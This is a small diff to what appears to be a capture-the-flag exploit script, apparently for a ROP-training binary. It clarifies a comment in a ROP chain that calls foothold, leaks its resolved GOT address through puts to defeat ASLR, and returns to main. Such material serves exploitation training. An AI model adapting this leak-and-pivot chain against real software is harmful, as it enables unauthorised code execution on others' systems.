@@ -204,7 +204,7 @@ ret     = rop.find_gadget(['ret'])[0]
 
 heap_payload  = p64(0x13) + p64(0x14) + p64(0x15)                # dummy values
 heap_payload += p64(foothold_plt)                                # call foothold to resolve its address
-heap_payload += p64(pop_rdi) + p64(foothold_got) + p64(puts_plt) # load foothold's resolved address into $rdi, call puts to print it out
+heap_payload += p64(pop_rdi) + p64(foothold_got) + p64(puts_plt) # load foothold's .got.plt entry into $rdi, call puts to print out the resolved address it points to.
 heap_payload += p64(ret)                                         # extra padding for stack alignment
 heap_payload += p64(main_func)                                   # re-run from main
 
